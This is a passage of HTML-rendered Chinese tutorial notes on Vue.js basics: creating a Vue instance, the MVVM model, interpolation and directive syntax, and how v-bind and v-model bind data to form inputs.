class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">初识Vue：</span></span><br><span class="line"><span class="comment">1.想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象；</span></span><br><span class="line"><span class="comment">2.root容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法；</span></span><br><span class="line"><span class="comment">3.root容器里的代码被称为【Vue模板】；</span></span><br><span class="line"><span class="comment">4.Vue实例和容器是一一对应的；</span></span><br><span class="line"><span class="comment">5.真实开发中只有一个Vue实例，并且会配合着组件一起使用；</span></span><br><span class="line"><span class="comment">6.&#123;&#123;xxx&#125;&#125;中的xxx要写js表达式，且xxx可以自动读取到data中的所有属性；</span></span><br><span class="line"><span class="comment">7.一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新；</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">注意区分：js表达式 和 js代码(语句)</span></span><br><span class="line"><span class="comment">1.表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方：</span></span><br><span class="line"><span class="comment">(1). a</span></span><br><span class="line"><span class="comment">(2). a+b</span></span><br><span class="line"><span class="comment">(3). demo(1)</span></span><br><span class="line"><span class="comment">(4). x === y ? &#x27;a&#x27; : &#x27;b&#x27;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2.js代码(语句)</span></span><br><span class="line"><span class="comment">(1). if()&#123;&#125;</span></span><br><span class="line"><span class="comment">(2). for()&#123;&#125;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 准备好一个容器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;demo&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello，&#123;&#123;name.toUpperCase()&#125;&#125;，&#123;&#123;address&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> &gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="comment">//创建Vue实例</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="javascript"><span class="attr">el</span>:<span class="string">&#x27;#demo&#x27;</span>, <span class="comment">//el用于指定当前Vue实例为哪个容器服务，值通常为css选择器字符串。</span></span></span><br><span class="line"><span class="javascript"><span class="attr">data</span>:&#123; <span class="comment">//data中用于存储数据，数据供el所指定的容器去使用，值我们暂时先写成一个对象。</span></span></span><br><span class="line"><span class="javascript"><span class="attr">name</span>:<span class="string">&#x27;atguigu&#x27;</span>,</span></span><br><span class="line"><span class="javascript"><span class="attr">address</span>:<span class="string">&#x27;北京&#x27;</span></span></span><br><span class="line"><span class="javascript">&#125;</span></span><br><span class="line"><span class="javascript">&#125;)</span></span><br><span class="line"><span class="javascript"></span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="MVVM"><a href="#MVVM" class="headerlink" title="MVVM"></a>MVVM</h2><p><img src="https://s2.loli.net/2022/01/14/djBfcoJT5DRpbQm.png" alt="image-20220114093011939"></p><p>M:Model:对应data中的数据</p><p>V：视图View：模板</p><p>VM：视图模型ViewModel：Vue实例对象</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>理解MVVM<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="comment">&lt;!-- 引入Vue --&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="comment">&lt;!-- </span></span></span><br><span class="line"><span class="comment"><span class="xml">MVVM模型</span></span></span><br><span class="line"><span class="comment"><span class="xml">1. M：模型(Model) ：data中的数据</span></span></span><br><span class="line"><span class="comment"><span class="xml">2. V：视图(View) ：模板代码</span></span></span><br><span class="line"><span class="comment"><span class="xml">3. VM：视图模型(ViewModel)：Vue实例</span></span></span><br><span class="line"><span class="comment"><span class="xml">观察发现：</span></span></span><br><span class="line"><span class="comment"><span class="xml">1.data中所有的属性，最后都出现在了vm身上。</span></span></span><br><span class="line"><span class="comment"><span class="xml">2.vm身上所有的属性 及 Vue原型上所有属性，在Vue模板中都可以直接使用。</span></span></span><br><span class="line"><span class="comment"><span class="xml">--&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>学校名称：&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>学校地址：&#123;&#123;address&#125;&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="comment">&lt;!-- &lt;h1&gt;测试一下1：&#123;&#123;1+1&#125;&#125;&lt;/h1&gt;</span></span></span><br><span class="line"><span class="comment"><span class="xml">&lt;h1&gt;测试一下2：&#123;&#123;$options&#125;&#125;&lt;/h1&gt;</span></span></span><br><span class="line"><span class="comment"><span class="xml">&lt;h1&gt;测试一下3：&#123;&#123;$emit&#125;&#125;&lt;/h1&gt;</span></span></span><br><span class="line"><span class="comment"><span class="xml">&lt;h1&gt;测试一下4：&#123;&#123;_c&#125;&#125;&lt;/h1&gt; --&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="keyword">const</span> vm = <span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="attr">el</span>: <span class="string">&#x27;#root&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        <span class="attr">data</span>: &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="attr">name</span>: <span class="string">&#x27;尚硅谷&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">            <span class="attr">address</span>: <span class="string">&#x27;北京&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">        &#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    &#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml">    <span class="built_in">console</span>.log(vm)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="数据绑定"><a href="#数据绑定" class="headerlink" title="数据绑定"></a>数据绑定</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>模板语法<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 引入Vue --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- </span></span></span><br><span class="line"><span class="comment"><span class="xml">Vue模板语法有2大类：</span></span></span><br><span class="line"><span class="comment"><span class="xml">1.插值语法：</span></span></span><br><span class="line"><span class="comment"><span class="xml">功能：用于解析标签体内容。</span></span></span><br><span class="line"><span class="comment"><span class="xml">写法：&#123;&#123;xxx&#125;&#125;，xxx是js表达式，且可以直接读取到data中的所有属性。</span></span></span><br><span class="line"><span class="comment"><span class="xml">2.指令语法：</span></span></span><br><span class="line"><span class="comment"><span class="xml">功能：用于解析标签（包括：标签属性、标签体内容、绑定事件.....）。</span></span></span><br><span class="line"><span class="comment"><span class="xml">举例：v-bind:href=&quot;xxx&quot; 或  简写为 :href=&quot;xxx&quot;，xxx同样要写js表达式，</span></span></span><br><span class="line"><span class="comment"><span class="xml"> 且可以直接读取到data中的所有属性。</span></span></span><br><span class="line"><span class="comment"><span class="xml">备注：Vue中有很多的指令，且形式都是：v-????，此处我们只是拿v-bind举个例子。</span></span></span><br><span class="line"><span class="comment"><span class="xml"></span></span></span><br><span class="line"><span class="comment"><span class="xml"> --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- 准备好一个容器--&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>插值语法<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>你好，&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">hr</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>指令语法<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">v-bind:href</span>=<span class="string">&quot;school.url.toUpperCase()&quot;</span> <span class="attr">x</span>=<span class="string">&quot;hello&quot;</span>&gt;</span>点我去&#123;&#123;school.name&#125;&#125;学习1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">:href</span>=<span class="string">&quot;school.url&quot;</span> <span class="attr">x</span>=<span class="string">&quot;hello&quot;</span>&gt;</span>点我去&#123;&#123;school.name&#125;&#125;学习2<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span></span><br><span class="line"><span class="javascript"><span class="xml">Vue.config.productionTip = <span class="literal">false</span> <span class="comment">//阻止 vue 在启动时生成生产提示。</span></span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="keyword">new</span> Vue(&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">data</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">name</span>:<span class="string">&#x27;jack&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">school</span>:&#123;</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">name</span>:<span class="string">&#x27;尚硅谷&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml"><span class="attr">url</span>:<span class="string">&#x27;http://www.atguigu.com&#x27;</span>,</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;</span></span></span><br><span class="line"><span class="javascript"><span class="xml">&#125;)</span></span></span><br><span class="line"><span class="javascript"><span class="xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;UTF-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;数据绑定&lt;/title&gt;</span><br><span class="line">&lt;!-- 引入Vue --&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;../js/vue.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;!-- </span><br><span class="line">Vue中有2种数据绑定的方式：</span><br><span class="line">1.单向绑定(v-bind)：数据只能从data流向页面。</span><br><span class="line">2.双向绑定(v-model)：数据不仅能从data流向页面，还可以从页面流向data。</span><br><span class="line">备注：</span><br><span class="line">1.双向绑定一般都应用在表单类元素上（如：input、select等）</span><br><span class="line">2.v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值。</span><br><span class="line"> --&gt;</span><br><span class="line">&lt;!-- 准备好一个容器--&gt;</span><br><span class="line">&lt;div id=&quot;root&quot;&gt;</span><br><span class="line">&lt;!-- 普通写法 --&gt;</span><br><span class="line">&lt;!-- 单向数据绑定：&lt;input type=&quot;text&quot; v-bind:value=&quot;name&quot;&gt;&lt;br/&gt;</span><br><span class="line">双向数据绑定：&lt;input type=&quot;text&quot; v-model:value=&quot;name&quot;&gt;&lt;br/&gt; --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 简写 --&gt;</span><br><span class="line">单向数据绑定：&lt;input type=&quot;text&quot; :value=&quot;name&quot;&gt;&lt;br/&gt;</span><br><span class="line">双向数据绑定：&lt;input type=&quot;text&quot; v-model=&quot;name&quot;&gt;&lt;br/&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 如下代码是错误的，因为v-model只能应用在表单类元素（输入类元素）上 --&gt;</span><br><span class="line">&lt;!-- &lt;h2 v-model:x=&quot;name&quot;&gt;你好啊&lt;/h2&gt; --&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。</span><br><span class="line"></span><br><span class="line">new Vue(&#123;</span><br><span class="line">el:&#x27;#root&#x27;,</span><br><span class="line">data:&#123;</span><br><span class="line">name:&#x27;尚硅谷&#x27;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="v-bind和v-model区别"><a href="#v-bind和v-model区别" class="headerlink" title="v-bind和v-model区别"></a>v-bind和v-model区别</h3><p><strong>v-bind</strong></p><p>首先来看下v-bind，它的用法是后面加冒号，跟上html元素的attributions，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p v-bind:<span class="class"><span class="keyword">class</span></span>=<span class="string">&quot;classed&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>这里的v-bind:class会产生什么效果呢？实际上，首先你可以看下如果不加v-bind:，也就是：<p class="classed">，这只是一个普通的p元素，含有一个.classed的类，没有任何数据参与进来。</p><p>当加上v-bind:之后，就不一样了。它的值classed不是字符串，而是vue实例对应的data.classed的这个变量。也就是说data.classed是什么值，它就会给class属性传递什么值，当data.classed发生变化的时候，class属性也发生变化，这非常适合用在通过css来实现动画效果的场合。除了class，其他大部分html原始的属性都可以通过这种方式来绑定，而且为了方便，它可以直接缩写成冒号形式，例如：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> app = Vue(&#123;</span><br><span class="line"> <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line"> <span class="attr">template</span>: <span class="string">&#x27;&lt;img :src=&quot;src&quot;&gt;&#x27;</span>,</span><br><span class="line"> <span class="attr">data</span>: &#123;</span><br><span class="line"> <span class="attr">src</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"> &#125;,</span><br><span class="line"> <span class="function"><span class="title">beforeMount</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line"> fetch(...).then(...).then(<span class="function"><span class="params">res</span> =&gt;</span> <span class="built_in">this</span>.src = res.src) <span class="comment">// 这里修改了data.src</span></span><br><span class="line"> &#125;,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面这段代码中，默认情况下data.src是空字符串，也就说不会有图片显示出来，但是当从远端获取到图片地址之后，更新了data.src，图片就会显示出来了。</p><p><strong>v-model</strong></p><p>v-model主要是用在表单元素中，它实现了双向绑定。双向绑定大家都非常熟了，简单的说就是默认情况下，它跟上面两种情况的数据绑定是一样的，实例的data.name发生变化的时候，对应的试图中也会发生变化。但是v-model绑定后，它还会反过来，在input中手动输入新的内容，会反过来修改data.name的值，如果在视图中其他地方使用到了data.name，那么这个地方就会因为data.name的变化而变化，从而实现关联动态效果。下面来举个栗子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> app = Vue(&#123;</span><br><span class="line"> <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line"> <span class="attr">template</span>: <span class="string">&#x27;&lt;label&gt;&lt;input v-model=&quot;name&quot;&gt;&#123;&#123;name&#125;&#125;&lt;/label&gt;&#x27;</span>,</span><br><span class="line"> <span class="attr">data</span>: &#123;</span><br><span class="line"> <span class="attr">name</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line"> &#125;,</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>上面<input>中绑定了name，那么当input的value发生变化时，data.name就会跟着发生变化，而data.name变化了的地方也会跟着变化。</p><p><strong>v-model是一种双向绑定，那么也就是说，你绑定的元素得有机会改变值。所以实际上v-model基本上只会用在input, textarea, select这些表单元素上。</strong></p><p><strong>v-bind和v-model混用</strong></p><p>有一些情况我们需要v-bind和v-model一起使用。这个时候如果不留神，就会搞乱状况，分不清哪里应该怎么控制。举个栗子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input:value=<span class="string">&quot;name&quot;</span> v-model=<span class="string">&quot;body&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>上面就是一个栗子。data.name和data.body，到底谁跟着谁变呢？甚至，它们会不会产生冲突呢？</p><p>实际上它们的关系和上面的阐述是一样的，v-bind产生的效果不含有双向绑定，所以:value的效果就是让input的value属性值等于data.name的值，而v-model的效果是使input和data.body建立双向绑定，因此首先data.body的值会给input的value属性，其次，当input中输入的值发生变化的时候，data.body还会跟着改变。</p><p>简单来说，区别如下：<br> 1.v-bind用来绑定数据和属性以及表达式，缩写为’：’<br> 2.v-<a href="https://so.csdn.net/so/search?q=model&spm=1001.2101.3001.7020">model</a>使用在<strong>表单</strong>中，实现双向数据绑定的，在表单元素外使用不起作用</p><h4 id="一、v-model"><a href="#一、v-model" class="headerlink" title="一、v-model"></a>一、v-model</h4><p>v-model多在表单中使用，在表单元素上创建双向绑定，根据控件类型选择正确的方法更新元素，可以绑定text、radio、checkbox、selected</p><h5 id="1-绑定text"><a href="#1-绑定text" class="headerlink" title="1. 绑定text"></a>1. 绑定text</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=<span class="string">&quot;text&quot;</span> v-model=<span class="string">&quot;val&quot;</span> &gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span> &#123;&#123;val&#125;&#125; <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="2-绑定radio"><a href="#2-绑定radio" class="headerlink" title="2. 绑定radio"></a>2. 绑定radio</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=<span class="string">&quot;radio&quot;</span> value=<span class="string">&quot;one&quot;</span> v-model=<span class="string">&quot;radioVal&quot;</span> /&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">value</span>=<span class="string">&quot;two&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;radioVal&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span> <span class="attr">v-bind</span>=<span class="string">&quot;radioval&quot;</span> /&gt;</span></span></span><br></pre></td></tr></table></figure><p>radioval的值随着选择单选框的值，会变成one 或者 two</p><h5 id="3-绑定checkBox"><a href="#3-绑定checkBox" class="headerlink" title="3. 绑定checkBox"></a>3. 绑定checkBox</h5><p>（1）单个勾选框，最终的值为逻辑值true和false</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=<span class="string">&quot;checkbox&quot;</span> v-model=<span class="string">&quot;checkVal&quot;</span>/&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;checkbox&quot;</span>&gt;</span>&#123;&#123;checkVal&#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>（2）多个勾选框时，将值绑定到一个数组</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=<span class="string">&quot;checkbox&quot;</span> value=<span class="string">&quot;apple&quot;</span> v-model=<span class="string">&quot;checkArray&quot;</span>/&gt;</span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;checkbox&quot;</span>&gt;</span>&#123;&#123;apple&#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">value</span>=<span class="string">&quot;banana&quot;</span> <span class="attr">v-model</span>=<span class="string">&quot;checkArray&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;checkbox&quot;</span>&gt;</span>&#123;&#123;banana&#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span 